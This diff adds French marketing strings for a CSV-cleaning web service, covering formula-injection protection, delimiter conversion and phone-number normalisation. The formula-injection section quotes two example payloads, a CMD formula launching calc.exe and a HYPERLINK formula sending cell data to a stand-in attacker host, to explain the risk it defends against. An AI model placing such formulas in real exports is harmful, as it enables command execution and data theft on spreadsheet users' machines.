@@ -683,5 +683,125 @@
       "title": "Boostez la délivrabilité et le réengagement de vos campagnes Klaviyo dès aujourd'hui.",
       "btn": "Nettoyer mon CSV Klaviyo"
     }
+  },
+  "formula_page": {
+    "meta": {
+      "title": "Neutraliser l'Injection de Formule CSV en Ligne | CleanMyCSV",
+      "desc": "Protégez vos CSV contre les failles de CSV Injection (=, +, -, @). Échappez automatiquement les formules Excel malveillantes et sécurisez vos exports."
+    },
+    "hero": {
+      "title": "Neutralisez les Injections de Formules CSV et Protégez vos Tableurs",
+      "subtitle": "Les formulaires web ou exports d'enquêtes exposent-ils votre équipe à des attaques d'injection CSV sous Excel ?<br><br>CleanMyCSV détecte et neutralise automatiquement les préfixes malveillants <code>=</code>, <code>+</code>, <code>-</code> et <code>@</code> avant l'ouverture du fichier.",
+      "cta": "Assainir mon Fichier CSV Gratuitement"
+    },
+    "badges": {
+      "b1": "Protection Injection CSV OWASP",
+      "b2": "Moteur Éphémère en Mémoire",
+      "b3": "Échappement Automatique par Quote"
+    },
+    "issues": {
+      "title": "Comprendre la Faille d'Injection CSV (Risque OWASP)",
+      "subtitle": "Les logiciels comme Microsoft Excel et Google Sheets exécutent automatiquement les formules débutant par des opérateurs dynamiques. Voici comment CleanMyCSV vous protège :"
+    },
+    "issue1": {
+      "title": "1. La Menace : Exécution de Commandes et Exfiltration de Données",
+      "desc": "Lorsqu'un attaquant saisit du texte comme <code>=CMD|' /C calc.exe'!A0</code> ou <code>=HYPERLINK(\"http://pirate.com/leak?data=\"&A2)</code> dans un formulaire, l'exportation CSV génère une formule exécutable dans Excel. L'ouverture du fichier peut lancer des commandes système ou exfiltrer des données à votre insu."
+    },
+    "issue2": {
+      "title": "2. Échappement Automatique par Simple Quote (')",
+      "desc": "CleanMyCSV analyse chaque cellule texte en mémoire isolée. Si une valeur commence par un opérateur à risque (<code>=</code>, <code>+</code>, <code>-</code>, <code>@</code>) et n'est pas un nombre mathématique, notre moteur ajoute une simple quote au début (ex: <code>'=CMD...</code>). Excel affiche alors le texte de manière neutre sans exécuter la formule."
+    },
+    "issue3": {
+      "title": "3. Distinction Mathématique Intelligente",
+      "desc": "Les scripts de sécurité basiques cassent les nombres négatifs ou les téléphones débutant par <code>+</code>. CleanMyCSV utilise des expressions régulières contextuelles pour différencier les vrais nombres mathématiques (ex: <code>-14.50</code> ou <code>+33 6 12 34 56 78</code>) des vecteurs d'injection."
+    },
+    "issue4": {
+      "title": "4. Sécurité Entreprise et Traitement Sans Stockage",
+      "desc": "Les équipes soucieuses de leur sécurité ne peuvent pas stocker leurs fichiers sur des serveurs tiers. CleanMyCSV s'exécute sur Cloud Run : les traitements se font 100% en mémoire, les liens de téléchargement expirent au bout de 15 min et les buckets de stockage sont purgés sous 24h."
+    },
+    "cta_banner": {
+      "title": "Sécurisez vos exports d'utilisateurs et de formulaires avant de les ouvrir en local.",
+      "btn": "Neutraliser les Risques de mon CSV"
+    }
+  },
+  "delimiter_page": {
+    "meta": {
+      "title": "Convertir CSV Point-Virgule en Virgule en Ligne | CleanMyCSV",
+      "desc": "Convertissez instantanément les séparateurs CSV de point-virgule (;) vers virgule (,) en ligne. Corrigez les délimiteurs Excel sans casser vos colonnes."
+    },
+    "hero": {
+      "title": "Convertir un CSV Point-Virgule en Virgule en Ligne",
+      "subtitle": "Excel européen a fusionné toutes vos colonnes dans une seule ligne illisible avec des points-virgules (<code>;</code>) ?<br><br>CleanMyCSV détecte le séparateur, sépare vos colonnes et standardise votre fichier au format virgule (<code>,</code>) instantanément.",
+      "cta": "Convertir le Séparateur de mon CSV"
+    },
+    "badges": {
+      "b1": "Convertisseur de Délimiteur Intelligent",
+      "b2": "Protection des Textes entre Guillemets",
+      "b3": "Réalignement Immédiat des Colonnes"
+    },
+    "issues": {
+      "title": "Pourquoi les Séparateurs de Colonnes CSV Cassent-ils ?",
+      "subtitle": "Les paramètres régionaux des systèmes d'exploitation créent des conflits entre logiciels européens et internationaux. Voici comment CleanMyCSV résout ce bug :"
+    },
+    "issue1": {
+      "title": "1. Le Conflit Régional des Séparateurs Excel",
+      "desc": "En Europe, Microsoft Excel utilise la virgule (<code>,</code>) comme séparateur décimal (ex: <code>12,50 €</code>). Pour éviter les erreurs, Excel exporte les CSV avec des points-virgules (<code>;</code>). Cependant, les logiciels américains (Google Sheets, Notion, Shopify, Airtable) exigent des virgules (<code>,</code>), fusionnant toutes vos données dans la colonne A."
+    },
+    "issue2": {
+      "title": "2. Protection des Textes (Virgules dans les Adresses)",
+      "desc": "Un simple \"Chercher & Remplacer\" détruit un CSV en convertissant les virgules présentes dans les adresses ou descriptions (ex: <code>\"123 Rue de la Paix, Bât A\"</code>). CleanMyCSV utilise un moteur d'analyse contextuelle qui respecte les guillemets et ne convertit que les vraies séparations de colonnes."
+    },
+    "issue3": {
+      "title": "3. Intégration de la Conversion Décimale",
+      "desc": "Lors de la conversion des points-virgules en virgules, les montants (ex: <code>10,50</code>) doivent aussi passer au format décimal à point (<code>10.50</code>) pour être reconnus comme des nombres mathématiques. CleanMyCSV gère la conversion des délimiteurs et des décimales en une seule étape."
+    },
+    "issue4": {
+      "title": "4. Mise à Niveau Automatique en UTF-8 BOM",
+      "desc": "En plus de la conversion des délimiteurs, CleanMyCSV convertit les encodages Windows ANSI et MacRoman vers le format universel UTF-8 avec BOM. Votre fichier converti s'ouvrira sans accents cassés sur tous les ordinateurs."
+    },
+    "cta_banner": {
+      "title": "Réalignez vos colonnes CSV fusionnées en moins de 5 secondes.",
+      "btn": "Convertir les Séparateurs"
+    }
+  },
+  "phone_page": {
+    "meta": {
+      "title": "Normaliser Numéros de Téléphone CSV au Format E.164 | CleanMyCSV",
+      "desc": "Formatage en masse de numéros de téléphone CSV au format international E.164 (+33, +1). Ajoutez les indicatifs, supprimez les extensions et restaurez les zéros."
+    },
+    "hero": {
+      "title": "Formater en Masse les Numéros de Téléphone CSV au Format E.164",
+      "subtitle": "Formatages chaotiques (<code>06.12.34.56.78</code>, <code>+33(0)6...</code>) ou indicatifs manquants dans vos fichiers de prospection ?<br><br>CleanMyCSV normalise vos numéros au format international E.164 propre automatiquement.",
+      "cta": "Normaliser mes Numéros Gratuitement"
+    },
+    "badges": {
+      "b1": "Format International E.164",
+      "b2": "Prêt pour Automates & VoIP",
+      "b3": "Sécurité Anti-ID Intégrée"
+    },
+    "issues": {
+      "title": "Comment CleanMyCSV Répare vos Numéros de Téléphone",
+      "subtitle": "Les fichiers de prospection et scraping contiennent des formats très hétérogènes. Voici comment notre moteur assainit vos données :"
+    },
+    "issue1": {
+      "title": "1. Ajout de l'Indicatif Pays International E.164",
+      "desc": "Les logiciels d'appel (Salesloft, RingCentral) et SMS (Twilio) exigent des numéros avec indicatifs internationaux. CleanMyCSV convertit les numéros locaux en format E.164 standard (ex: <code>06 12 34 56 78</code> devient <code>+33 6 12 34 56 78</code>)."
+    },
+    "issue2": {
+      "title": "2. Nettoyage des Symboles Parasites & Postes Interne",
+      "desc": "Les bases de données associent souvent deux numéros (<code>0612345678 / 0123456789</code>) ou des extensions (<code>poste 102</code>). Notre moteur isole le numéro principal, extrait proprement les postes internes et retire les caractères parasites (points, slashes, parenthèses)."
+    },
+    "issue3": {
+      "title": "3. Restauration du Zéro Initial Effacé par Excel",
+      "desc": "Ouvrir un CSV sous Excel efface le zéro initial des numéros locaux (transformant <code>0612345678</code> en <code>612345678</code>). CleanMyCSV détecte les colonnes de téléphone et réinsère le zéro manquant avant d'appliquer l'indicatif."
+    },
+    "issue4": {
+      "title": "4. Protection Anti-ID pour les Identifiants Métiers",
+      "desc": "Contrairement aux scripts basiques qui déforment toutes les suites de chiffres, CleanMyCSV intègre un garde-fou Anti-ID. Les séries de plus de 13 chiffres sans ponctuation téléphonique (SIRET, codes-barres, identifiants de transactions) sont automatiquement préservées."
+    },
+    "cta_banner": {
+      "title": "Garantissez 100 % de joignabilité sur vos listes de prospection téléphonique.",
+      "btn": "Formater mes Téléphones"
+    }
   }
 }
